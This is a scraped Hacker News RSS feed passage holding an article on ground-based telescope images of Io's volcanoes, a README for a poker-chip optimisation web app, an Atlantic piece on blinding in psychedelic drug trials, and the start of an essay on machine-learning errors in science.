<p>Io's volcanic activity was first discovered in 1979, when Linda Morabito, an engineer on NASA's Voyager mission, spotted an eruption plume in one of the images taken by the spacecraft during its famous "Grand Tour" of the outer planets. Since then, countless observations have been made that document Io's restless nature, from both space and Earth-based telescopes.</p>

<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2024/glimpses-of-a-volcanic-1.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2024/glimpses-of-a-volcanic-1.jpg" data-sub-html="Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope. The image combines three spectral bands — infrared, red and yellow — to highlight the reddish ring around the volcano Pele (below and to the right of the moon's center) and the white ring around Pillan Patera, to the right of Pele. Credit: INAF/Large Binocular Telescope Observatory/Georgia State University; IRV-band observations by SHARK-VIS/F. Pedichini; processing by D. Hope, S. Jefferies, G. Li Causi">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2024/glimpses-of-a-volcanic-1.jpg" alt="Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft" title="Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope. The image combines three spectral bands — infrared, red and yellow — to highlight the reddish ring around the volcano Pele (below and to the right of the moon's center) and the white ring around Pillan Patera, to the right of Pele. Credit: INAF/Large Binocular Telescope Observatory/Georgia State University; IRV-band observations by SHARK-VIS/F. Pedichini; processing by D. Hope, S. Jefferies, G. Li Causi">
             <figcaption>
                Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope. The image combines three spectral bands — infrared, red and yellow — to highlight the reddish ring around the volcano Pele (below and to the right of the moon's center) and the white ring around Pillan Patera, to the right of Pele. Credit: INAF/Large Binocular Telescope Observatory/Georgia State University; IRV-band observations by SHARK-VIS/F. Pedichini; processing by D. Hope, S. Jefferies, G. Li Causi
            </figcaption>        </figure>
    </div>
<p>Study co-author Ashley Davies, a principal scientist at NASA's Jet Propulsion Laboratory, said the new image taken by SHARK-VIS is so rich in detail that it has allowed the team to identify a major resurfacing event in which the plume deposit around a prominent volcano known as Pele, located in Io's southern hemisphere close to the equator, is being covered by eruption deposits from Pillan Patera, a neighboring volcano. A similar eruption sequence was observed by NASA's Galileo spacecraft, which explored the Jupiter system between 1995 and 2003.</p>
<p>"We interpret the changes as dark lava deposits and white sulfur dioxide deposits originating from an eruption at Pillan Patera, which partially cover Pele's red, sulfur-rich plume deposit," Davies said. "Before SHARK-VIS, such resurfacing events were impossible to observe from Earth."</p>

																																			<p>While telescope images in the infrared can detect hot spots caused by ongoing volcanic eruptions, they are not sharp enough to reveal surface details and unambiguously identify the locations of the eruptions, explained co-author Imke de Pater, professor emerita of astronomy at the University of California—Berkeley.</p>
<p>"Sharper images at <a href="https://phys.org/tags/visible+wavelengths/" rel="tag">visible wavelengths</a> like those provided by SHARK-VIS and LBT are essential to identify both locations of <a href="https://phys.org/tags/eruptions/" rel="tag">eruptions</a> and surface changes not detectable in the infrared, such as new plume deposits," de Pater said, adding that visible light observations provide researchers with vital context for the interpretation of infrared observations, including those from spacecraft such as Juno, which is currently orbiting Jupiter.</p>
<p>SHARK-VIS was built by the Italian National Institute for Astrophysics at the Rome Astronomical Observatory and is managed by a team led by principal investigator Fernando Pedichini, assisted by project manager Roberto Piazzesi.</p>
<p>In 2023, it was installed, together with its complementary near-infrared instrument SHARK-NIR, at the LBT to fully take advantage of the telescope's outstanding adaptive optics system. The instrument houses a fast, ultra-low-noise camera that allows it to observe the sky in "fast imaging" mode, capturing slow-motion footage that freezes the optical distortions caused by atmospheric turbulence, and to post-process data to an unprecedented sharpness.</p>

																																						
																																			<p>Gianluca Li Causi, data processing manager for SHARK-VIS at the Italian National Institute for Astrophysics, explained, "We process our data on the computer to remove any trace of the sensor's electronic footprint. We then select the best frames and combine them using a highly efficient software package called Kraken, developed by our colleagues Douglas Hope and Stuart Jefferies from Georgia State University. Kraken allows us to remove atmospheric effects, revealing Io in incredible sharpness."</p>
<p>SHARK-VIS instrument scientist Simone Antoniucci said he anticipates new observations to be made of objects throughout the solar system.</p>
<p>"The keen vision of SHARK-VIS is particularly suited to observing the surfaces of many solar system bodies, not only the moons of giant planets but also asteroids," he said. "We have already observed some of those, with the data currently being analyzed, and are planning to observe more."</p>

																																																					
																				<div>
																						<p><strong>More information:</strong>
												Observation of Io's Resurfacing via Plume Deposition Using Ground-based Adaptive Optics at Visible Wavelengths with LBT SHARK-VIS, <i>Geophysical Research Letters</i> (2024). <a data-doi="1" href="https://dx.doi.org/10.1029/2024GL108609" target="_blank">DOI: 10.1029/2024GL108609</a>. On <i>arXiv</i>: <a href="https://arxiv.org/abs/2405.19604" target="_blank">arxiv.org/abs/2405.19604</a>
																						
																						</p>
																					</div>
                               											
																					
                              										                                        
										<!-- print only -->
										<div>
											 <p><strong>Citation</strong>:
												Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft (2024, May 31)
												retrieved 4 June 2024
												from https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html
											 </p>
											 <p>
											 This document is subject to copyright. Apart from any fair dealing for the purpose of private study or research, no
											 part may be reproduced without the written permission. The content is provided for information purposes only.
											 </p>
										</div>
                                        
									</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Diffusion on Syntax Trees for Program Synthesis (372 pts)]]></title>
            <link>https://tree-diffusion.github.io/</link>
            <guid>40569531</guid>
            <pubDate>Tue, 04 Jun 2024 00:52:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tree-diffusion.github.io/">https://tree-diffusion.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=40569531">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Allocate poker chips optimally with mixed-integer nonlinear programming (133 pts)]]></title>
            <link>https://github.com/jstrieb/poker-chipper</link>
            <guid>40569385</guid>
            <pubDate>Tue, 04 Jun 2024 00:29:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/jstrieb/poker-chipper">https://github.com/jstrieb/poker-chipper</a>, See on <a href="https://news.ycombinator.com/item?id=40569385">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><div dir="auto"><h2 tabindex="-1" dir="auto">
<p dir="auto"><a href="https://jstrieb.github.io/poker-chipper" rel="nofollow"><img src="https://github.com/jstrieb/poker-chipper/raw/master/public/favicon.svg?raw=true" width="125" height="125"></a></p>
<p dir="auto">Poker Chipper</p>
</h2><a id="user-content-poker-chipper" aria-label="Permalink: Poker Chipper" href="#poker-chipper"></a></div>
<p dir="auto"><a href="https://jstrieb.github.io/poker-chipper" rel="nofollow">Optimally
select poker chip denominations for cash games using constrained, nonlinear
optimization.</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">About</h2><a id="user-content-about" aria-label="Permalink: About" href="#about"></a></p>
<p dir="auto">Imagine hosting a small poker game. You know how many friends will attend, how
many chips you have, and the buy in. How do you pick chip denominations?</p>
<p dir="auto">Without Poker Chipper, picking chip denominations is manual and error-prone.
You first try to pick values that divide each other nicely and are easy to
remember. (Alternatively, struggle to recall the values from the last time you
played.) You next try to find a way to make the chosen values sum to the buy
in. Then, you backtrack whenever there aren't enough chips for everyone, or
when there are too many chips left over. Finally, you settle for a suboptimal
chip allocation so that you can actually start playing.</p>
<p dir="auto">With Poker Chipper, on the other hand, picking chip denominations is fast and
easy. Input the number of players, buy in, blinds, and number of chips. After
waiting a moment for the mathematically optimal results, you can save them for
next time, or share them with others. If you want to modify the results, adjust
the "advanced options," and the chip denominations will be recomputed
accordingly.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">How Poker Chipper Works</h2><a id="user-content-how-poker-chipper-works" aria-label="Permalink: How Poker Chipper Works" href="#how-poker-chipper-works"></a></p>
<p dir="auto">Poker Chipper uses mixed-integer nonlinear programming (MINLP), which is a form
of constrained, nonconvex optimization, to optimally pick poker chip
denominations.</p>
<p dir="auto">Optimization is performed using a "solver" – in this case,
<a href="https://www.scipopt.org/" rel="nofollow">SCIP</a>. Some inputs to Poker Chipper are translated
into solver constraints, which affect what denominations are admissible. Other
inputs influence the solver's objective function, which affects how candidate
denominations are evaluated, ranked, and chosen. In the user interface, inputs
affecting constraints, and inputs affecting the objective function are
described as influencing the "requirements" and "score," respectively, of
candidate solutions.</p>
<p dir="auto">Poker Chipper is a fully static web application. In other words, all of the
processing involved in performing optimization occurs client-side – entirely in
the user's browser. The SCIP solver is designed to run natively, so Poker
Chipper bundles it for the browser by compiling SCIP to WebAssembly (WASM) with
<a href="https://emscripten.org/" rel="nofollow">Emscripten</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">How to Read the Code</h2><a id="user-content-how-to-read-the-code" aria-label="Permalink: How to Read the Code" href="#how-to-read-the-code"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Code Table of Contents</h3><a id="user-content-code-table-of-contents" aria-label="Permalink: Code Table of Contents" href="#code-table-of-contents"></a></p>
<p dir="auto">The links below are listed in the order the code should be read to understand
the application from the highest to lowest level.</p>
<ul dir="auto">
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/src/App.svelte"><code>src/App.svelte</code></a> – main high-level application</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/src"><code>src/*.svelte</code></a> – UI components</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/src/solve.js"><code>src/solve.js</code></a> – convert user inputs to MINLP model and solve
using WASM SCIP</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/src/solveWorker.js"><code>src/solveWorker.js</code></a> – web worker to run solver in
non-blocking thread</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/public/serviceWorker.js"><code>public/serviceWorker.js</code></a> – service worker for
caching and offline functionality</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/public"><code>public/*</code></a> – PWA manifest, global stylesheet, favicons, etc.</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/experiments"><code>experiments/*</code></a> – exploration of initial concept in Python
(with both Z3, and later, SCIP), and Dockerfile for compiling SCIP with
Emscripten</li>
<li><a href="https://github.com/jstrieb/poker-chipper/blob/master/src/compiled"><code>src/compiled/*</code></a> – SCIP compiled to WASM via Emscripten,
plus associated support files</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Application Architecture</h3><a id="user-content-application-architecture" aria-label="Permalink: Application Architecture" href="#application-architecture"></a></p>
<p dir="auto">In the diagram below, labeled arrows represent asynchronous fetch requests and
message passing.</p>
<section data-identity="9cbda2e5-1521-4775-afe6-9c3f6eab7f75" data-host="https://viewscreen.githubusercontent.com" data-src="https://viewscreen.githubusercontent.com/markdown/mermaid?docs_host=https%3A%2F%2Fdocs.github.com" data-type="mermaid" aria-label="mermaid rendered output container">
  <div dir="auto" data-json="{&quot;data&quot;:&quot;flowchart LR\n    A[Svelte Front End] --&amp;gt;|Solve Requests| B[\&quot;Web Worker\n    (non-blocking thread)\&quot;]\n    B --&amp;gt;|Solutions| A\n    A &amp;lt;--&amp;gt;|Static Assets| C[Service Worker]\n    B &amp;lt;--&amp;gt;|Solver Static Assets| C\n    C --&amp;gt;|Cache| C\n    C &amp;lt;--&amp;gt;|Static Assets| D[Web Server]\n&quot;}" data-plain="flowchart LR
    A[Svelte Front End] -->|Solve Requests| B[&quot;Web Worker
    (non-blocking thread)&quot;]
    B -->|Solutions| A
    A <-->|Static Assets| C[Service Worker]
    B <-->|Solver Static Assets| C
    C -->|Cache| C
    C <-->|Static Assets| D[Web Server]
">
      <pre lang="mermaid" aria-label="Raw mermaid code">flowchart LR
    A[Svelte Front End] --&gt;|Solve Requests| B["Web Worker
    (non-blocking thread)"]
    B --&gt;|Solutions| A
    A &lt;--&gt;|Static Assets| C[Service Worker]
    B &lt;--&gt;|Solver Static Assets| C
    C --&gt;|Cache| C
    C &lt;--&gt;|Static Assets| D[Web Server]
</pre>
    </div>
  <span role="presentation">
    <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="16" height="16" viewBox="0 0 16 16" fill="none" data-view-component="true">
  <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none"></circle>
  <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke"></path>
</svg>
  </span>
</section>

<p dir="auto"><h2 tabindex="-1" dir="auto">Project Status &amp; Contributing</h2><a id="user-content-project-status--contributing" aria-label="Permalink: Project Status &amp; Contributing" href="#project-status--contributing"></a></p>
<p dir="auto">Poker Chipper is actively maintained. If there are no recent commits,
everything is running smoothly! As of the initial release, the code is stable,
and there are no major, outstanding features that remain to be added.</p>
<p dir="auto">Bug reports and feature requests via GitHub Issues are encouraged. Pull
requests with more than 20 lines of code are unlikely to be merged quickly,
unless associated with prior discussion or accompanied by substantial,
explanatory English prose. In other words, pull requests containing code
without context may be merged after much delay, or may not be merged at all.</p>
<p dir="auto">Since Poker Chipper is a fully static web application with no server-side
processing (outside of serving unchanging files), it is extremely scalable, and
has a very low maintenance burden. As such, even if something were to happen to
me, and I could not continue to work on the project, the <a href="https://jstrieb.github.io/poker-chipper/" rel="nofollow">public
version</a> should continue to remain
functional and available online as long as my GitHub account is open and the
<a href="https://jstrieb.github.io/" rel="nofollow">jstrieb.github.io</a> domain is active.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Support the Project</h2><a id="user-content-support-the-project" aria-label="Permalink: Support the Project" href="#support-the-project"></a></p>
<p dir="auto">The best ways to support the project are to:</p>
<ul dir="auto">
<li>Share the project on sites like Twitter, Reddit, and Hacker News</li>
<li>Report any bugs, glitches, errors, or shortcomings that you find</li>
<li>Star the repository and follow me on GitHub</li>
<li>Host a version of the code translated into another language</li>
</ul>
<p dir="auto">If you insist on spending money to show your support, please do so in a way
that is widely beneficial. In particular, donations to the following
organizations help me, in addition to the general, Internet-using public:</p>
<ul dir="auto">
<li><a href="https://supporters.eff.org/donate/" rel="nofollow">Electronic Frontier Foundation</a></li>
<li><a href="https://archive.org/donate/index.php" rel="nofollow">The Internet Archive</a></li>
<li><a href="https://signal.org/donate/" rel="nofollow">Signal Foundation</a></li>
<li><a href="https://donate.mozilla.org/en-US/" rel="nofollow">Mozilla</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Acknowledgments &amp; Greetz</h2><a id="user-content-acknowledgments--greetz" aria-label="Permalink: Acknowledgments &amp; Greetz" href="#acknowledgments--greetz"></a></p>
<p dir="auto">Poker Chipper would not have been possible without help and feedback from:</p>
<ul dir="auto">
<li><a href="https://github.com/lsnow99">Logan Snow</a></li>
<li><a href="https://www.linkedin.com/in/amyjl" rel="nofollow">Amy Liu</a></li>
<li><a href="https://twitter.com/chrischerian" rel="nofollow">Chris Cherian</a></li>
<li><a href="https://www.linkedin.com/in/ani-chowdhury" rel="nofollow">Ani Chowdhury</a></li>
<li>Will Hooper</li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Psychedelics are challenging the standard of randomized controlled trials (122 pts)]]></title>
            <link>https://www.theatlantic.com/health/archive/2024/06/psychedelics-mdma-ptsd-fda-placebo/678588/</link>
            <guid>40568515</guid>
            <pubDate>Mon, 03 Jun 2024 22:45:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theatlantic.com/health/archive/2024/06/psychedelics-mdma-ptsd-fda-placebo/678588/">https://www.theatlantic.com/health/archive/2024/06/psychedelics-mdma-ptsd-fda-placebo/678588/</a>, See on <a href="https://news.ycombinator.com/item?id=40568515">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><header data-event-module="hero"><div><div><p>How do you study mind-altering drugs when every clinical-trial participant knows they’re tripping?</p></div><div><figure><div data-flatplan-lead_figure_media="true"><picture><img alt="Psychedelic neon-blue-and=pink image of test tubes, sample containers, a clipboard, and a pen being sucked into a vortex" sizes="(min-width: 976px) 976px, 100vw" srcset="https://cdn.theatlantic.com/thumbor/chwH8rwkHlh5tjhWGZ5wZRE4RqA=/0x0:2000x1125/750x422/media/img/mt/2024/06/RCT/original.jpg 750w, https://cdn.theatlantic.com/thumbor/69WJ7GKWx2HEdbEguEojtZCy8PU=/0x0:2000x1125/828x466/media/img/mt/2024/06/RCT/original.jpg 828w, https://cdn.theatlantic.com/thumbor/dTZwxQdR0py24vu2XqE7ZQ0bOxg=/0x0:2000x1125/960x540/media/img/mt/2024/06/RCT/original.jpg 960w, https://cdn.theatlantic.com/thumbor/94gN6tSPm3USLm6YrRA50pb7KHg=/0x0:2000x1125/976x549/media/img/mt/2024/06/RCT/original.jpg 976w, https://cdn.theatlantic.com/thumbor/8NA2ueGeJDZktq6p30Ch5R4lLbY=/0x0:2000x1125/1952x1098/media/img/mt/2024/06/RCT/original.jpg 1952w" src="https://cdn.theatlantic.com/thumbor/dTZwxQdR0py24vu2XqE7ZQ0bOxg=/0x0:2000x1125/960x540/media/img/mt/2024/06/RCT/original.jpg" id="article-lead-image" width="960" height="540"></picture></div><figcaption data-flatplan-lead_figure_caption="true">Illustration by Matteo Giuseppe Pani. Source: Getty.</figcaption></figure></div></div><gpt-ad format="injector" sizes-at-0="mobile-wide" targeting-pos="injector-article-start" sizes-at-976="desktop-wide"></gpt-ad></header><section data-event-module="article body" data-flatplan-body="true"><p data-flatplan-paragraph="true">Tomorrow, a Food and Drug Administration advisory committee will meet to discuss whether the United States should approve its first psychedelic drug. The fate of the treatment—MDMA-assisted therapy for post-traumatic stress disorder—will turn on how the FDA interprets data from two <a data-event-element="inline link" href="https://www.nature.com/articles/s41591-021-01336-3">clinical trials</a> that, on their face, are promising. Long-suffering patients who took the drug while undergoing intensive talk therapy were <a data-event-element="inline link" href="https://www.nature.com/articles/s41591-023-02565-4">about twice as likely</a> to recover from PTSD as patients who got the placebo with therapy.</p><p data-flatplan-paragraph="true">If the treatment is approved this summer, it could bring relief to some of the approximately 13 million Americans with PTSD. It could also serve as a model for other psychedelics to meet the FDA’s regulatory bar. But there’s a conundrum at the core of these two clinical trials, one that has plagued virtually all efforts to study psychedelics.</p><p data-flatplan-paragraph="true">In clinical trials, participants (and the researchers studying them) generally aren’t supposed to know whether they’re getting the actual drug or a placebo, to avoid allowing people’s expectations about a treatment to shape their response to it. Blinding, as this practice is called, is a key component of a randomized controlled clinical trial, or RCT—medicine’s gold standard for demonstrating that a drug actually works. But virtually no one can take a psychedelic drug and not know it.</p><p data-flatplan-paragraph="true">Some experts believe that unblinding threatens to undermine the entire field of psychedelic research because it means researchers can’t know whether the drugs’ early promise in clinical trials is real or a mirage, driven by the placebo effect and outsize expectations about the power of these drugs. But others argue that RCTs themselves are at fault. To them, psychedelics are exposing long-ignored cracks in our gold standard, especially for testing drugs that act on our minds.</p><p id="injected-recirculation-link-0" data-view-action="view link - injected link - item 1" data-event-element="injected link" data-event-position="1"><a href="https://www.theatlantic.com/science/archive/2018/06/what-its-like-to-trip-on-the-most-potent-magic-mushroom/561860/">Read: What it’s like to trip on the most potent magic mushroom</a></p><p data-flatplan-paragraph="true">When randomized controlled trials are well designed, “there is no substitute,” Boris Heifets, a neuroscientist at Stanford University, told me. In an RCT, participants get randomly sorted into two groups, receiving either the treatment or a placebo. Scientists have prized such trials since the 1960s for their power to rule out all the nondrug reasons people who are given a new medication might get better. Chief among those reasons is the placebo effect, in which a patient’s belief in a treatment, rather than anything about the drug or procedure itself, leads to improvement. If trial participants come in with sky-high expectations (as experts suspect is the case in many psychedelics trials), knowing that they’ve received a drug could fuel positive responses, and learning they’ve been denied it could cause them to react negatively. “We’ve gotten a ton of things <a data-event-element="inline link" href="https://www.theatlantic.com/health/archive/2017/11/placebo-effect-of-the-heart/545012/">wrong</a> by trusting unblinded results,” says David Rind, the chief medical officer of the Institute for Clinical and Economic Review, a nonprofit that evaluates new medical treatments.</p><p data-flatplan-paragraph="true">For all of RCTs’ advantages, “I think it’s obvious that they’re not well suited for studying psychedelics,” Heifets said. In cancer-drug trials, participants won’t know the difference between a saline IV drip and medicine; to test new surgical procedures, control groups sometimes get cut into and sewed up without the actual treatment. But psychedelics like psilocybin or LSD launch people into hallucinatory states that bend space and time. MDMA, known to many as ecstasy, is less extreme, but still sparks expansive feelings of love and empathy. “Participants will know within half an hour whether they’ve been assigned to the experimental or placebo condition,” Michiel van Elk, a cognitive psychologist at Leiden University, told me. In the MDMA clinical trials, run by the pharmaceutical company Lykos Therapeutics, nearly all participants correctly guessed which group they were in.</p><p data-flatplan-paragraph="true">Many scientists want to get around this problem by designing better blinds. Some labs have tried to keep patients in the dark by administering drugs <a data-event-element="inline link" href="https://www.nature.com/articles/s44220-023-00140-x">under anesthesia</a> or using mind-altering pills like <a data-event-element="inline link" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6879524/">methamphetamines</a> as a placebo. Others are trying to engineer new psychedelics that <a data-event-element="inline link" href="https://www.theatlantic.com/health/archive/2023/11/non-hallucinogenic-psychedelic-clinical-therapy/675942/">skip the trip entirely</a>. But to other scientists, clever attempts to stuff psychedelics into the RCT framework ignore the possibility that psychedelics’ benefits aren’t reducible to the biochemical action of the drug itself. Since the 1960s, psychedelic researchers have known that the beliefs and expectations a person brings to a trip can influence whether it’s healing or nightmarish. (That’s why most psychedelic-therapy protocols include several psychotherapy sessions before, during, and after treatment.) By striving to cleave the drug’s effects from the context in which it’s given—to a patient by a therapist, both of whom are hoping for healing—blinded studies may fail to capture the full picture.</p><p id="injected-recirculation-link-1" data-view-action="view link - injected link - item 2" data-event-element="injected link" data-event-position="2"><a href="https://www.theatlantic.com/health/archive/2023/02/psychedelic-drug-therapy-effects-brain-neuroplasticity/672910/">Read: Psychedelics open your brain. You might not like what falls in.</a></p><p data-flatplan-paragraph="true">From this perspective, high proportions of unblinding in positive psychedelic trials don’t necessarily mean that the results are invalid. “It’s how people engage with those effects and their therapist that’s contributing to the improvement,” Eduardo Schenberg, a neuroscientist at Instituto Phaneros, a nonprofit psychedelic-research center in Brazil, told me. Recent research backs this up. One small study found that among chronic PTSD patients who got MDMA-assisted therapy, the strength of the bond between therapist and patient—something the drug helps forge with its empathy-inducing effects—<a data-event-element="inline link" href="https://pubmed.ncbi.nlm.nih.gov/38174611/">predicted treatment success</a>. Given the importance of context, even the most perfectly designed RCTs may fail to capture how helpful these drugs are outside trials, Schenberg said.</p><p data-flatplan-paragraph="true">Such failure, if it exists, might extend beyond psychedelics to several kinds of psychoactive drugs. For instance, a <a data-event-element="inline link" href="https://pubmed.ncbi.nlm.nih.gov/34861421/">2022 analysis</a> found that many antidepressant trials fail to effectively blind participants, in part because of side effects. “We know that <a data-event-element="inline link" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4172306/">80 percent</a> of the treatment response from antidepressants can be attributed to the placebo response,” Amelia Scott, a clinical psychologist at Macquarie University who co-wrote that study, told me. Yet in practice, antidepressants are effective for many people, suggesting that RCTs aren’t quite capturing what these drugs can offer—and that limiting ourselves to treatments that can be perfectly blinded could mean ignoring helpful mental-health interventions. “We shouldn’t be afraid to question the gold standard,” Schenberg told me. “For different kinds of diseases and treatments, we may need slightly different standards.”</p><p data-flatplan-paragraph="true">RCTs likely won’t lose their perch as the gold standard anytime soon, for evaluating psychedelics or anything else. But they could be supplemented with other kinds of studies that would broaden our understanding of how psychedelics work, Matt Butler, a neuroscientist at King’s College London, told me. Scientists are already trying open-label trials, where participants know which treatment they’re getting, and measuring expectations along with treatment effects. Descriptive studies, which <a data-event-element="inline link" href="https://akjournals.com/view/journals/2054/aop/article-10.1556-2054.2024.00369/article-10.1556-2054.2024.00369.xml">track how treatments are working</a> in actual clinics, could provide a richer picture of what therapeutic contexts work best. “These levels of evidence aren’t as good as RCTs,” Butler said, but they could help deepen our understanding of when therapies that don’t conform to RCTs could be most helpful.</p><p id="injected-recirculation-link-2" data-view-action="view link - injected link - item 3" data-event-element="injected link" data-event-position="3"><a href="https://www.theatlantic.com/health/archive/2023/11/non-hallucinogenic-psychedelic-clinical-therapy/675942/">Read: What if psychedelics’ hallucinations are just a side effect?</a></p><p data-flatplan-paragraph="true">None of this is to say that Lykos’s flawed RCT data will be enough to convince the FDA’s advisers that Americans with PTSD should be offered MDMA. Several groups, including the American Psychiatric Association, have <a data-event-element="inline link" href="https://www.regulations.gov/comment/FDA-2024-N-1938-0037">expressed concern</a> about the trials ahead of the advisory meeting. In addition to the unblinding issue, claims that therapists encouraged participants to report favorable results and hide adverse events prompted the Institute for Clinical and Economic Review to release a <a data-event-element="inline link" href="https://icer.org/news-insights/press-releases/institute-for-clinical-and-economic-review-publishes-evidence-report-on-treatment-for-post-traumatic-stress-disorder/">report casting doubt</a> on the studies. Lykos CEO Amy Emerson pushed back in a statement, saying, “We stand by the quality and integrity of our research and development program.” Still, some researchers remain worried. “If this sets a precedent that these trials are acceptable data, what does that mean for the future?” Suresh Muthukumaraswamy, a neuropharmacologist at the University of Auckland, told me.</p><p data-flatplan-paragraph="true">The recent past suggests that blinding may not be a deal-breaker for the FDA. In 2019, the agency approved <a data-event-element="inline link" href="https://www.fda.gov/news-events/press-announcements/fda-approves-new-nasal-spray-medication-treatment-resistant-depression-available-only-certified">Spravato esketamine nasal spray</a>—a version of ketamine—for the treatment of depression despite <a data-event-element="inline link" href="https://icer.org/wp-content/uploads/2020/10/ICER_TRD_Final_Evidence_Report_062019.pdf">concerns</a> about unblinding in the drug’s clinical trials. And the FDA <a data-event-element="inline link" href="https://maps.org/news/media/press-release-fda-grants-breakthrough-therapy-designation-for-mdma-assisted-psychotherapy-for-ptsd-agrees-on-special-protocol-assessment-for-phase-3-trials/">worked with Lykos</a> to design the MDMA-therapy trials after designating it a breakthrough treatment in 2017. In an email, an FDA spokesperson told me that blinded RCTs provide the most rigorous level of evidence, but “unblinded studies can still be considered adequate and well-controlled as long as there is a valid comparison with a control.” In such cases, the spokesperson said, regulators can take into account things like the size of the treatment effect in deciding whether the treatment performed significantly better than the placebo.</p><p id="injected-recirculation-link-3" data-view-action="view link - injected link - item 4" data-event-element="injected link" data-event-position="4"><a href="https://www.theatlantic.com/health/archive/2017/11/placebo-effect-of-the-heart/545012/">Read: Placebo effect of the heart</a></p><p data-flatplan-paragraph="true">Even if the FDA is on board, rolling out psychedelic therapies before scientists fully understand the interplay among expectation, therapy, and drugs could mean missing an opportunity to force companies to provide data that would meaningfully advance the study of these drugs, Muthukumaraswamy said. It also risks undermining these treatments in the long run. If sky-high expectations are ultimately fueling the positive results we see now, the FDA could end up approving a treatment that becomes less effective as its novelty wears off. That’s especially true if we’re missing key components of what makes these treatments work, or what puts people at risk for bad experiences. To better answer those questions—for psychedelics and other psychoactive drugs—we may need studies that go beyond the gold standard.</p></section><div data-event-module="footer"><address id="article-writer-0" data-event-element="author" data-flatplan-bio="true"><div><p><a href="https://www.theatlantic.com/author/jonathan-lambert/" data-label="https://www.theatlantic.com/author/jonathan-lambert/" data-action="click author - name">Jonathan Lambert</a> is a journalist based in Washington, D.C., who covers the intersection of science, health, and policy. He holds a master’s degree in neurobiology and behavior from Cornell University. He has written for <em>Science News</em>, NPR, <em>Grid</em>, and <em>Quanta Magazine</em>.</p></div></address></div><gpt-ad format="injector" sizes-at-0="mobile-wide,native,house" targeting-pos="injector-most-popular" sizes-at-976="desktop-wide,native,house"></gpt-ad></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Scientists should use AI as a tool, not an oracle (117 pts)]]></title>
            <link>https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool</link>
            <guid>40568026</guid>
            <pubDate>Mon, 03 Jun 2024 21:54:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool">https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool</a>, See on <a href="https://news.ycombinator.com/item?id=40568026">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p><span>Who produces AI hype? As we discuss in the AI Snake Oil </span><a href="https://www.aisnakeoil.com/p/ai-snake-oil-is-now-available-to" rel="">book</a><span>, it is not just companies and the media but also AI researchers. For example, a pair of widely-publicized papers in Nature in December 2023 claimed to have </span><a href="https://www.nature.com/articles/s41586-023-06735-9" rel="">discovered</a><span> over 2.2 million new materials using AI, and robotically </span><a href="https://www.nature.com/articles/s41586-023-06734-w" rel="">synthesized</a><span> 41 of them. Unfortunately, the claims were </span><a href="https://chemrxiv.org/engage/chemrxiv/article-details/65957d349138d231611ad8f7" rel="">quickly</a><span> </span><a href="https://x.com/Robert_Palgrave/status/1744383965270581615" rel="">debunked</a><span>: “Most of the [41] materials produced were misidentified, and the rest were already known”. As for the large dataset, examining a sample of 250 compounds showed that it was </span><a href="https://pubs.acs.org/doi/10.1021/acs.chemmater.4c00643" rel="">mostly junk</a><span>.</span></p><p><span>A core selling point of machine learning is discovery without understanding, which is why errors are particularly common in machine-learning-based science. Three years ago, we </span><a href="https://reproducible.cs.princeton.edu/" rel="">compiled evidence</a><span> revealing that an error called leakage — the machine learning version of teaching to the test — was pervasive, affecting hundreds of papers from 17 disciplines. Since then, we have been trying to understand the problem better and devise solutions.&nbsp;</span></p><p>This post presents an update. In short, we think things will get worse before they get better, although there are glimmers of hope on the horizon.&nbsp;</p><p><strong>The carnage continues</strong></p><p><span>In our most recent compilation, the number of disciplines where researchers have </span><a href="https://reproducible.cs.princeton.edu/#rep-failures" rel="">uncovered leakage</a><span> in published work has reached 30. The majority are medical fields, which we strongly suspect is due to the fact that since errors in medical research can be particularly consequential, medical fields 